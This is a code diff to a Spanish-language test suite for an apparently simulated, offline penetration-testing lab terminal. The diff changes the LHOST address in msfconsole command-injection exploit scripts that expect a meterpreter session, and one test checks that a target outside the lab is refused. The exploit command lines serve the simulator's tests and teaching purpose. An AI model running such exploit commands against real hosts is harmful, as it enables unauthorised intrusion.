@@ -46,7 +46,7 @@ describe("msfconsole — explotación real, stateful y determinista", () => {
   it("exploit CMDI contra el objetivo vulnerable abre sesión y da la bandera", () => {
     const script =
       "use exploit/nande/http/cmd_injection ; " +
-      "set RHOSTS 10.10.5.50 ; set LHOST 10.10.0.5 ; set LPORT 4444 ; " +
+      "set RHOSTS 10.10.5.50 ; set LHOST 10.10.0.10 ; set LPORT 4444 ; " +
       "exploit";
     const out = term.execute(`msfconsole -x "${script}"`);
     expect(out).toContain("Sesión meterpreter 1 abierta");
@@ -59,7 +59,7 @@ describe("msfconsole — explotación real, stateful y determinista", () => {
     // rootlab (10.10.5.40) NO tiene CMDI; el exploit debe fallar.
     const script =
       "use exploit/nande/http/cmd_injection ; set RHOSTS 10.10.5.40 ; " +
-      "set LHOST 10.10.0.5 ; set LPORT 4444 ; exploit";
+      "set LHOST 10.10.0.10 ; set LPORT 4444 ; exploit";
     const out = term.execute(`msfconsole -x "${script}"`);
     expect(out).toMatch(/no se creó ninguna sesión|no es vulnerable|no hay servicio/i);
     expect(out).not.toContain("Sesión meterpreter");
@@ -68,7 +68,7 @@ describe("msfconsole — explotación real, stateful y determinista", () => {
   it("rechaza objetivos fuera del laboratorio (100% offline)", () => {
     const script =
       "use exploit/nande/http/cmd_injection ; set RHOSTS 8.8.8.8 ; " +
-      "set LHOST 10.10.0.5 ; set LPORT 4444 ; exploit";
+      "set LHOST 10.10.0.10 ; set LPORT 4444 ; exploit";
     const out = term.execute(`msfconsole -x "${script}"`);
     expect(out).toMatch(/no es una máquina del laboratorio/i);
   });
